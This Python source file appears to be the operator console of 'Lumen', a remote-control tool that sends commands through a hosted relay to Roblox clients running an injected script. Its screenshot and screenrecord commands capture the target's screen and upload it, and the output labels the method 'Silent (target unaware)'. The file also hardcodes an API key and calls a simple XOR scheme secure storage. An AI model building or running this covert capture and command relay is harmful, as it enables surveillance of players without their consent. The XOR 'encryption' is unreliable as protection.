import requests
import json
from datetime import datetime
import os
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

# API Configuration
API_BASE = "https://lseypdqwyekqdndladsk.supabase.co/functions/v1"
CAPTURE_ENDPOINT = f"{API_BASE}/capture"
LISTEN_ENDPOINT = f"{API_BASE}/listen"
EXECUTE_ENDPOINT = f"{API_BASE}/execute"
COMMAND_STATUS_ENDPOINT = f"{API_BASE}/command-status"
AGENT_ENDPOINT = f"{API_BASE}/agent"
API_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxzZXlwZHF3eWVrcWRuZGxhZHNrIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjY4NzYyNzQsImV4cCI6MjA4MjQ1MjI3NH0.-Ebx3SwdHhEAkUg_TYPIxPktVI5Q-vRU1wxo69p7n90"

# Connection state
connected_account = None
private_agent_id = None
agent_status = None
last_known_place_id = None

# Agent storage file (local only, secure)
AGENTS_FILE = "agents.dat"

def load_agents():
    """Load saved agents from encrypted local file"""
    if not os.path.exists(AGENTS_FILE):
        return []

    try:
        with open(AGENTS_FILE, 'r') as f:
            # Simple XOR encryption for basic security
            encrypted = f.read()
            if not encrypted:
                return []

            # Decrypt
            key = "LUMEN_SECURE_KEY_2024"
            decrypted = ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(encrypted))
            return json.loads(decrypted)
    except:
        return []

def save_agents(agents):
    """Save agents to encrypted local file"""
    try:
        # Remove duplicates
        unique_agents = []
        seen_ids = set()
        for agent in agents:
            if agent['id'] not in seen_ids:
                unique_agents.append(agent)
                seen_ids.add(agent['id'])

        # Encrypt before saving
        data = json.dumps(unique_agents)
        key = "LUMEN_SECURE_KEY_2024"
        encrypted = ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

        with open(AGENTS_FILE, 'w') as f:
            f.write(encrypted)

        return True
    except Exception as e:
        print(f"  ⚠️  Failed to save agents: {e}")
        return False

def add_agent_to_storage(agent_id):
    """Add agent to storage if not exists"""
    agents = load_agents()

    # Check if already exists
    for agent in agents:
        if agent['id'] == agent_id:
            # Update last_used timestamp
            agent['last_used'] = datetime.now().isoformat()
            save_agents(agents)
            return

    # Add new agent
    agents.append({
        'id': agent_id,
        'added_on': datetime.now().isoformat(),
        'last_used': datetime.now().isoformat(),
        'name': None,
        'starred': False
    })

    save_agents(agents)

def set_agent_name(agent_id, name):
    """Set custom name for an agent"""
    agents = load_agents()

    for agent in agents:
        if agent['id'] == agent_id:
            agent['name'] = name
            save_agents(agents)
            return True

    return False

def star_agent(agent_identifier):
    """Star an agent by ID or name"""
    agents = load_agents()

    # Find the target agent
    target_agent = None
    for agent in agents:
        if agent['id'] == agent_identifier or (agent.get('name') and agent['name'].lower() == agent_identifier.lower()):
            target_agent = agent
            break

    if not target_agent:
        return False, "Agent not found"

    # Unstar all other agents
    for agent in agents:
        agent['starred'] = False

    # Star the target
    target_agent['starred'] = True
    save_agents(agents)

    return True, target_agent

def get_starred_agent():
    """Get the currently starred agent"""
    agents = load_agents()

    for agent in agents:
        if agent.get('starred', False):
            return agent

    return None

def remove_agent_from_storage(agent_id):
    """Remove agent from storage"""
    agents = load_agents()
    agents = [a for a in agents if a['id'] != agent_id]
    save_agents(agents)

def gradient_text(text):
    """Apply purple gradient"""
    lines = text.split('\n')
    colors = [
        '\033[38;5;141m',
        '\033[38;5;135m',
        '\033[38;5;129m',
        '\033[38;5;93m',
        '\033[38;5;57m',
        '\033[38;5;55m',
    ]
    result = []
    for i, line in enumerate(lines):
        color = colors[min(i, len(colors) - 1)]
        result.append(f"{color}{line}\033[0m")
    return '\n'.join(result)

def send_command(account_id, command, args=None):
    """Send command to client and wait for response"""
    try:
        headers = {
            "Content-Type": "application/json",
            "apikey": API_KEY,
            "Authorization": f"Bearer {API_KEY}"
        }

        payload = {
            "roblox_account_id": account_id,
            "command": command,
            "args": args or {}
        }

        response = requests.post(EXECUTE_ENDPOINT, json=payload, headers=headers, timeout=30)

        if response.status_code != 200:
            return {"success": False, "error": f"Status {response.status_code}"}

        result = response.json()
        command_id = result.get("command_id")

        if not command_id:
            return {"success": False, "error": "No command_id returned"}

        # Increase poll attempts and timeout for slower commands
        max_attempts = 60  # 30 seconds total
        for attempt in range(max_attempts):
            time.sleep(0.5)

            try:
                status_response = requests.get(
                    f"{COMMAND_STATUS_ENDPOINT}?command_id={command_id}",
                    headers=headers,
                    timeout=10
                )

                if status_response.status_code == 200:
                    status_data = status_response.json()
                    if status_data.get("status") == "completed":
                        return {
                            "success": True,
                            "data": status_data.get("response", {})
                        }
                    elif status_data.get("status") == "failed":
                        return {
                            "success": False,
                            "error": status_data.get("response", {}).get("error", "Command failed")
                        }
            except requests.exceptions.Timeout:
                # Continue polling even if one request times out
                if attempt < max_attempts - 1:
                    continue
                else:
                    return {"success": False, "error": "Command status check timeout"}
            except Exception as e:
                # Continue polling on other errors
                if attempt < max_attempts - 1:
                    continue
                else:
                    return {"success": False, "error": f"Polling error: {str(e)}"}

        return {"success": False, "error": "Command timeout - no response received"}

    except requests.exceptions.Timeout:
        return {"success": False, "error": "Connection timeout - server took too long to respond"}
    except requests.exceptions.ConnectionError:
        return {"success": False, "error": "Connection error - check your internet connection"}
    except Exception as e:
        return {"success": False, "error": f"Unexpected error: {str(e)}"}

def send_agent_command(agent_id, command, args=None):
    """Send command to private agent - works exactly like send_command"""
    return send_command(f"agent_{agent_id}", command, args)

def get_agent_status(agent_id, timeout=5):
    """Get current agent status with timeout"""
    try:
        result = send_agent_command(agent_id, "agent_status")
        if result.get("success"):
            return result.get("data")
        return None
    except Exception as e:
        return None

def get_agent_status_fast(agent_id):
    """Fast agent status check with reduced timeout"""
    try:
        headers = {
            "Content-Type": "application/json",
            "apikey": API_KEY,
            "Authorization": f"Bearer {API_KEY}"
        }

        payload = {
            "roblox_account_id": f"agent_{agent_id}",
            "command": "agent_status",
            "args": {}
        }

        response = requests.post(EXECUTE_ENDPOINT, json=payload, headers=headers, timeout=3)

        if response.status_code != 200:
            return None

        result = response.json()
        command_id = result.get("command_id")

        if not command_id:
            return None

        # Reduced polling for faster checks
        max_attempts = 6  # 3 seconds total
        for attempt in range(max_attempts):
            time.sleep(0.5)

            try:
                status_response = requests.get(
                    f"{COMMAND_STATUS_ENDPOINT}?command_id={command_id}",
                    headers=headers,
                    timeout=2
                )

                if status_response.status_code == 200:
                    status_data = status_response.json()
                    if status_data.get("status") == "completed":
                        return status_data.get("response", {})
                    elif status_data.get("status") == "failed":
                        return None
            except:
                continue

        return None

    except:
        return None

def cmd_screenrecord(args=None):
    """Silent screen recording from agent/port"""
    global connected_account, private_agent_id

    if not connected_account and not private_agent_id:
        clear()
        banner()
        print("\n  \033[38;5;196m✗ No active connection\033[0m")
        print("  \033[38;5;93m→ Run 'runport' or 'agent' command first\033[0m\n")
        input("\n  Press Enter to continue...")
        return

    duration = 5
    if args:
        try:
            duration = int(args.replace("--", ""))
            if duration > 10: duration = 10
        except:
            pass

    use_agent = private_agent_id and not connected_account
    target_id = private_agent_id if use_agent else connected_account

    clear()
    banner()
    print("\033[38;5;141m╔═══════════════════════════════════════════════╗\033[0m")
    print("\033[38;5;141m║          SILENT SCREEN RECORDING              ║\033[0m")
    print("\033[38;5;141m╚═══════════════════════════════════════════════╝\033[0m\n")

    print(f"  \033[38;5;93m→ Target: {target_id} {'(Agent)' if use_agent else '(Port)'}\033[0m")
    print(f"  \033[38;5;135m→ Initiating silent recording (Max 10s)...\033[0m")
    print(f"  \033[38;5;93m→ This may take a while to process...\033[0m\n")

    payload = {"duration": duration}
    if use_agent:
        result = send_agent_command(target_id, "screenrecord", payload)
    else:
        result = send_command(target_id, "screenrecord", payload)

    if not result.get("success"):
        print(f"\n  \033[38;5;196m✗ Failed to initiate recording\033[0m")
        print(f"  Error: {result.get('error', 'Unknown')}")
        input("\n  Press Enter to continue...")
        return

    print(f"  \033[38;5;141m✓ Recording initiated successfully\033[0m")
    print(f"  \033[38;5;93m→ Waiting for video to process...\033[0m\n")

    time.sleep(2)

    url = "PENDING"
    for attempt in range(120):
        dots = "." * ((attempt % 3) + 1) + " " * (2 - (attempt % 3))
        print(f"  \033[38;5;135m⏳ Processing Video{dots}\033[0m", end='\r', flush=True)
        time.sleep(2)

        if use_agent:
            check_result = send_agent_command(target_id, "record_status")
        else:
            check_result = send_command(target_id, "record_status")

        if check_result.get("success"):
            data = check_result.get("data")
            
            def extract_url(val):
                if not val: return None
                if isinstance(val, str):
                    val = val.strip()
                    if val.startswith("http"): return val
                    return None
                if isinstance(val, dict):
                    for k in ["response", "result", "url", "data", "message"]:
                        res = extract_url(val.get(k))
                        if res: return res
                    for v in val.values():
                        res = extract_url(v)
                        if res: return res
                return None

            found_url = extract_url(data)
            if found_url:
                url = found_url
                break
            
            data_str = ""
            if isinstance(data, str):
                data_str = data.strip().upper()
            elif isinstance(data, dict):
                data_str = str(data).upper()

            if "PENDING" in data_str:
                continue

            if "ERROR" in data_str or "FAILED" in data_str:
                url = data if isinstance(data, str) else str(data)
                break

    clear()
    banner()
    print("\033[38;5;141m╔═══════════════════════════════════════════════╗\033[0m")
    print("\033[38;5;141m║          SILENT SCREEN RECORDING              ║\033[0m")
    print("\033[38;5;141m╚═══════════════════════════════════════════════╝\033[0m\n")

    if url != "PENDING" and not url.startswith("ERROR"):
        print(f"  \033[38;5;141m✓ Video recorded successfully!\033[0m\n")
    else:
        print(f"  \033[38;5;196m✗ Recording timed out or failed\033[0m\n")

    print(f"  \033[38;5;93m→ Target: {target_id}\033[0m")
    print(f"  \033[38;5;93m→ Duration: {duration}s\033[0m")
    print(f"  \033[38;5;93m→ Method: Silent (target unaware)\033[0m\n")
    print(f"  \033[38;5;135mVideo URL:\033[0m")
    print(f"  \033[38;5;141m→ {url}\033[0m\n")
    print(f"  \033[38;5;93m💡 Note: The URL is stored in _G.LUMEN_RECORD_URL on target\033[0m")

    input("\n  Press Enter to continue...")

def cmd_agent_list():
    """List all saved agents with status - OPTIMIZED VERSION"""
    clear()
    banner()
    print("\033[38;5;141m╔═══════════════════════════════════════════════╗\033[0m")
    print("\033[38;5;141m║            SAVED AGENTS LIST                  ║\033[0m")
    print("\033[38;5;141m╚═══════════════════════════════════════════════╝\033[0m\n")

    agents = load_agents()

    if not agents:
        print("  \033[38;5;93m→ No saved agents found\033[0m")
        print("  \033[38;5;93m→ Connect to an agent to save it\033[0m\n")
        input("\n  Press Enter to continue...")
        return

    print(f"  \033[38;5;135m→ Found {len(agents)} saved agent(s)\033[0m")
    print("  \033[38;5;93m→ Checking status (parallel)...\033[0m\n")

    print("  \033[38;5;93m" + "─"*45 + "\033[0m\n")

    # Fetch all agent statuses in parallel using ThreadPoolExecutor
    agent_statuses = {}
    with ThreadPoolExecutor(max_workers=5) as executor:
        # Submit all status check tasks
        future_to_agent = {executor.submit(get_agent_status_fast, agent['id']): agent['id'] for agent in agents}

        # Collect results as they complete
        for future in as_completed(future_to_agent):
            agent_id = future_to_agent[future]
            try:
                status = future.result()
                agent_statuses[agent_id] = status
            except Exception as e:
                agent_statuses[agent_id] = None

    # Display agents with status
    for i, agent in enumerate(agents, 1):
        agent_id = agent['id']
        agent_name = agent.get('name')
        is_starred = agent.get('starred', False)

        # Safe datetime parsing
        try:
            added_on = datetime.fromisoformat(agent['added_on']).strftime("%Y-%m-%d %H:%M")
        except:
            added_on = agent.get('added_on', 'Unknown')

        try:
            last_used = datetime.fromisoformat(agent['last_used']).strftime("%Y-%m-%d %H:%M")
        except:
            last_used = agent.get('last_used', 'Unknown')

        status = agent_statuses.get(agent_id)

        # Display agent info with star indicator
        star_icon = "⭐ " if is_starred else ""
        name_display = f" ({agent_name})" if agent_name else ""
        print(f"  \033[38;5;141m[{i}] {star_icon}Agent ID:\033[0m {agent_id}{name_display}")
        print(f"      \033[38;5;93mAdded:\033[0m {added_on}")
        print(f"      \033[38;5;93mLast Used:\033[0m {last_used}")

        if status:
            print(f"      \033[38;5;141m✓ Status: ONLINE\033[0m")
            print(f"      \033[38;5;135mUptime:\033[0m {status.get('uptime', 0)} minutes")

            if status.get('current_game'):
                game = status['current_game']
                print(f"      \033[38;5;135m📍 Game:\033[0m {game.get('name', 'Unknown')}")
                print(f"      \033[38;5;135m📍 Place ID:\033[0m {game.get('place_id', 'Unknown')}")
        else:
            print(f"      \033[38;5;196m✗ Status: OFFLINE\033[0m")

        print()

    print("  \033[38;5;93m" + "─"*45 + "\033[0m\n")
    print("  \033[38;5;93mType agent number to connect (e.g., '1')\033[0m")
    print("  \033[38;5;93mType 'remove <number>' to delete (e.g., 'remove 2')\033[0m")
    print("  \033[38;5;93mType 'back' to return\033[0m\n")

    choice = input("  → ").strip().lower()

    if choice == "back" or choice == "":
        return

    # Handle remove command
    if choice.startswith("remove "):
        try:
            agent_num = int(choice.split()[1])
            idx = agent_num - 1

            if 0 <= idx < len(agents):
                removed_id = agents[idx]['id']
                remove_agent_from_storage(removed_id)
                print(f"\n  \033[38;5;141m✓ Removed agent {removed_id}\033[0m")
            else:
                print("\n  \033[38;5;196m✗ Invalid agent number\033[0m")

            time.sleep(1.5)
            return cmd_agent_list()  # Refresh the list
        except (ValueError, IndexError):
            print("\n  \033[38;5;196m✗ Invalid format. Use: remove <number>\033[0m")
            time.sleep(1.5)
            return cmd_agent_list()

    # Handle connect to agent
    try:
        agent_num = int(choice)
        idx = agent_num - 1

        if 0 <= idx < len(agents):
            global private_agent_id
            private_agent_id = agents[idx]['id']

            # Update last_used with current timestamp
            agents[idx]['last_used'] = datetime.now().isoformat()
            save_agents(agents)

            agent_display = agents[idx].get('name') or private_agent_id
            print(f"\n  \033[38;5;141m✓ Connected to agent {agent_display}\033[0m")

            # Show agent status
            status = agent_statuses.get(private_agent_id)
            if status:
                if status.get('current_game'):
                    game = status['current_game']
                    print(f"  \033[38;5;135m→ Currently in: {game.get('name', 'Unknown')}\033[0m")

            time.sleep(2)
        else:
            print("\n  \033[38;5;196m✗ Invalid agent number\033[0m")
            time.sleep(1.5)
            return cmd_agent_list()
    except ValueError:
        print("\n  \033[38;5;196m✗ Invalid input. Enter a number or 'remove <number>'\033[0m")
        time.sleep(1.5)
        return cmd_agent_list()

def cmd_agent():
    """Private Agent management"""
    global private_agent_id, agent_status

    clear()
    banner()
    print("\033[38;5;141m╔═══════════════════════════════════════════════╗\033[0m")
    print("\033[38;5;141m║          PRIVATE AGENT MANAGER                ║\033[0m")
    print("\033[38;5;141m╚═══════════════════════════════════════════════╝\033[0m\n")

    if private_agent_id:
        print(f"  \033[38;5;141m✓ Current Agent:\033[0m {private_agent_id}\n")

        status = get_agent_status(private_agent_id)
        if status:
            print(f"  \033[38;5;135mStatus:\033[0m {status.get('status', 'Unknown')}")
            if status.get('current_game'):
                print(f"  \033[38;5;135mGame:\033[0m {status['current_game']['name']} (ID: {status['current_game']['place_id']})")
            if status.get('uptime'):
                print(f"  \033[38;5;135mUptime:\033[0m {status['uptime']} minutes")
            print()

        print("  \033[38;5;93m[1]\033[0m Change Agent")
        print("  \033[38;5;93m[2]\033[0m Disconnect Agent")
        print("  \033[38;5;93m[3]\033[0m Back\n")

        choice = input("  Select → ").strip()

        if choice == "1":
            private_agent_id = None
            agent_status = None
            return cmd_agent()
        elif choice == "2":
            print(f"\n  \033[38;5;135m→ Disconnecting agent...\033[0m")
            send_agent_command(private_agent_id, "agent_disconnect")
            private_agent_id = None
            agent_status = None
            print("  \033[38;5;141m✓ Agent disconnected\033[0m")
            time.sleep(1.5)
        return

    print("  \033[38;5;93mEnter your Private Agent's Roblox User ID\033[0m")
    print("  \033[38;5;93m(This should be your alt account)\033[0m\n")

    agent_id = input("  Agent User ID → ").strip()

    if not agent_id:
        print("\n  ✗ Invalid agent ID")
        time.sleep(1.5)
        return

    print(f"\n  \033[38;5;135m→ Connecting to agent {agent_id}...\033[0m")
    time.sleep(1)

    result = send_agent_command(agent_id, "agent_ping")
    if result.get("success"):
        private_agent_id = agent_id

        # Save agent to storage
        add_agent_to_storage(agent_id)

        print(f"  \033[38;5;141m✓ Agent connected successfully!\033[0m")
        print(f"  \033[38;5;93m→ Agent ID: {agent_id}\033[0m")
        print(f"  \033[38;5;141m→ Agent saved for future use\033[0m\n")
    else:
        print(f"  \033[38;5;196m✗ Connection failed\033[0m")
        print(f"  \033[38;5;93m→ Make sure agent script is running on alt account\033[0m\n")

    input("\n  Press Enter to continue...")

def cmd_screenshot():
    """Silently capture screenshot from agent/port"""
    global connected_account, private_agent_id

    if not connected_account and not private_agent_id:
        clear()
        banner()
        print("\n  \033[38;5;196m✗ No active connection\033[0m")
        print("  \033[38;5;93m→ Run 'runport' or 'agent' command first\033[0m\n")
        input("\n  Press Enter to continue...")
        return

    use_agent = private_agent_id and not connected_account
    target_id = private_agent_id if use_agent else connected_account

    clear()
    banner()
    print("\033[38;5;141m╔═══════════════════════════════════════════════╗\033[0m")
    print("\033[38;5;141m║          SILENT SCREENSHOT CAPTURE            ║\033[0m")
    print("\033[38;5;141m╚═══════════════════════════════════════════════╝\033[0m\n")

    print(f"  \033[38;5;93m→ Target: {target_id} {'(Agent)' if use_agent else '(Port)'}\033[0m")
    print(f"  \033[38;5;135m→ Initiating silent capture...\033[0m")
    print(f"  \033[38;5;93m→ This may take 30-60 seconds...\033[0m\n")

    if use_agent:
        result = send_agent_command(target_id, "screenshot")
    else:
        result = send_command(target_id, "screenshot")

    if not result.get("success"):
        print(f"\n  \033[38;5;196m✗ Failed to initiate capture\033[0m")
        print(f"  Error: {result.get('error', 'Unknown')}")
        input("\n  Press Enter to continue...")
        return

    print(f"  \033[38;5;141m✓ Capture initiated successfully\033[0m")
    print(f"  \033[38;5;93m→ Waiting for upload to complete...\033[0m\n")

    time.sleep(2)

    url = "PENDING"
    for attempt in range(60):
        dots = "." * ((attempt % 3) + 1) + " " * (2 - (attempt % 3))
        print(f"  \033[38;5;135m⏳ Processing{dots}\033[0m", end='\r', flush=True)
        time.sleep(2)

        if use_agent:
            check_result = send_agent_command(target_id, "screenshot_status")
        else:
            check_result = send_command(target_id, "screenshot_status")

        if check_result.get("success"):
            data = check_result.get("data")
            
            def extract_url(val):
                if not val: return None
                if isinstance(val, str):
                    val = val.strip()
                    if val.startswith("http"): return val
                    return None
                if isinstance(val, dict):
                    for k in ["response", "result", "url", "data", "message"]:
                        res = extract_url(val.get(k))
                        if res: return res
                    for v in val.values():
                        res = extract_url(v)
                        if res: return res
                return None

            found_url = extract_url(data)
            if found_url:
                url = found_url
                break
            
            data_str = ""
            if isinstance(data, str):
                data_str = data.strip().upper()
            elif isinstance(data, dict):
                data_str = str(data).upper()

            if "PENDING" in data_str:
                continue

            if "ERROR" in data_str or "FAILED" in data_str:
                url = data if isinstance(data, str) else str(data)
                break

    clear()
    banner()
    print("\033[38;5;141m╔═══════════════════════════════════════════════╗\033[0m")
    print("\033[38;5;141m║          SILENT SCREENSHOT CAPTURE            ║\033[0m")
    print("\033[38;5;141m╚═══════════════════════════════════════════════╝\033[0m\n")

    if url != "PENDING" and not url.startswith("ERROR"):
        print(f"  \033[38;5;141m✓ Screenshot captured successfully!\033[0m\n")
    else:
        print(f"  \033[38;5;196m✗ Capture timed out or failed\033[0m\n")

    print(f"  \033[38;5;93m→ Target: {target_id}\033[0m")
    print(f"  \033[38;5;93m→ Resolution: 854x480\033[0m")
    print(f"  \033[38;5;93m→ Method: Silent (target unaware)\033[0m\n")
    print(f"  \033[38;5;135mScreenshot URL:\033[0m")
    print(f"  \033[38;5;141m→ {url}\033[0m\n")
    print(f"  \033[38;5;93m💡 Note: The URL is stored in _G.LUMEN_SCREENSHOT_URL on target\033[0m")

    input("\n  Press Enter to continue...")

def clear():
    print("\033[2J\033[H", end="")

def banner():
    art = r"""   __   __  ____  ________  __
  / /  / / / /  |/  / __/ |/ /
 / /__/ /_/ / /|_/ / _//    / 
/____/\____/_/  /_/___/_/|_/  
                              """
    print(gradient_text(art))
    print("  Game Data Capture & AI Analysis")
    print("  ═══════════════════════════════\n")

def main():
    while True:
        clear()
        banner()
        print("╔═══════════════════════════════════════════════╗")
        print("║                 MAIN MENU                     ║")
        print("╚═══════════════════════════════════════════════╝\n")

        if connected_account:
            print(f"  \033[38;5;141m✓ Connected:\033[0m \033[38;5;93m{connected_account}\033[0m")
        else:
            print(f"  \033[38;5;196m✗ Not connected\033[0m")

        if private_agent_id:
            print(f"  \033[38;5;141m✓ Agent Active:\033[0m \033[38;5;93m{private_agent_id}\033[0m")
        else:
            print(f"  \033[38;5;196m✗ No agent\033[0m")

        print("\n  \033[38;5;135mCOMMANDS:\033[0m")
        print("  \033[38;5;93m• screenshot\033[0m    → Silent screenshot capture")
        print("  \033[38;5;93m• screenrecord\033[0m  → Silent screen recording (Max 10s)")

        print("\n  \033[38;5;135mAGENT COMMANDS:\033[0m")
        print("  \033[38;5;141m• agent\033[0m         → Setup private agent")
        print("  \033[38;5;141m• agent --list\033[0m  → List saved agents")

        print("\n  \033[38;5;93m• exit\033[0m          → Exit Lumen")
        print("\n  ───────────────────────────────────────────\n")

        choice = input("  Select → ").strip().lower()

        if choice == "exit":
            clear()
            print("\n  Thanks for using Lumen!")
            print("  ───────────────────────────\n")
            sys.exit(0)
        elif choice == "screenshot":
            cmd_screenshot()
        elif choice.startswith("screenrecord"):
            args = choice.replace("screenrecord", "", 1).strip()
            cmd_screenrecord(args if args else None)
        elif choice == "agent":
            cmd_agent()
        elif choice == "agent --list":
            cmd_agent_list()
        else:
            print("\n  ✗ Invalid option")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n  → Shutting down Lumen\n")
        sys.exit(0)

def wait_for_agent_reconnect(agent_id, target_place_id, max_wait=60):
    """Wait for agent to reconnect after game hop"""
    print(f"\n  \033[38;5;135m→ Waiting for agent to join game...\033[0m")
    print(f"  \033[38;5;93m→ Target Place ID: {target_place_id}\033[0m")
    print(f"  \033[38;5;93m→ This may take 10-30 seconds...\033[0m\n")

    start_time = time.time()
    last_status = None
    dots = 0
    initial_place_id = None

    # Get initial place ID to detect any change
    initial_status = get_agent_status(agent_id)
    if initial_status and initial_status.get('current_game'):
        initial_place_id = initial_status['current_game'].get('place_id')

    while time.time() - start_time < max_wait:
        dots = (dots + 1) % 4
        loading = "." * dots + " " * (3 - dots)
        print(f"  \033[38;5;141m⏳ Connecting{loading}\033[0m", end='\r', flush=True)

        status = get_agent_status(agent_id)
        if status:
            current_game = status.get('current_game')
            if current_game and current_game.get('place_id'):
                current_place_id = current_game['place_id']
                game_name = current_game.get('name', 'Unknown')

                # Check if game name or place changed (indicating successful teleport)
                if not last_status or last_status.get('place_id') != current_place_id:
                    print(f"\n  \033[38;5;93m→ Detected in: {game_name} (ID: {current_place_id})\033[0m")
                    last_status = current_game

                # Success conditions:
                # 1. Exact place ID match
                # 2. Place ID changed from initial (teleport happened)
                # 3. Game loaded after being in no game
                if current_place_id == target_place_id:
                    print("\n\n  \033[38;5;141m✓ Agent successfully connected to exact place!\033[0m")
                    return True, current_game
                elif initial_place_id and current_place_id != initial_place_id and time.time() - start_time > 5:
                    # Place ID changed after 5 seconds - likely successful teleport to related game
                    print("\n\n  \033[38;5;141m✓ Agent successfully connected!\033[0m")
                    print(f"  \033[38;5;93m→ Joined: {game_name} (Related place)\033[0m")
                    return True, current_game
                elif not initial_place_id and time.time() - start_time > 8:
                    # Agent was in no game, now in a game after 8 seconds
                    print("\n\n  \033[38;5;141m✓ Agent successfully connected!\033[0m")
                    return True, current_game

        time.sleep(2)

    # Check one last time if agent is in any game
    final_status = get_agent_status(agent_id)
    if final_status and final_status.get('current_game') and final_status['current_game'].get('place_id'):
        current_game = final_status['current_game']
        if current_game['place_id'] != initial_place_id:
            print("\n\n  \033[38;5;141m✓ Agent connected (verified on final check)!\033[0m")
            return True, current_game

    print("\n\n  \033[38;5;196m✗ Connection timeout\033[0m")
    print(f"  \033[38;5;93m→ Agent may still be loading or teleport failed\033[0m")
    return False, None
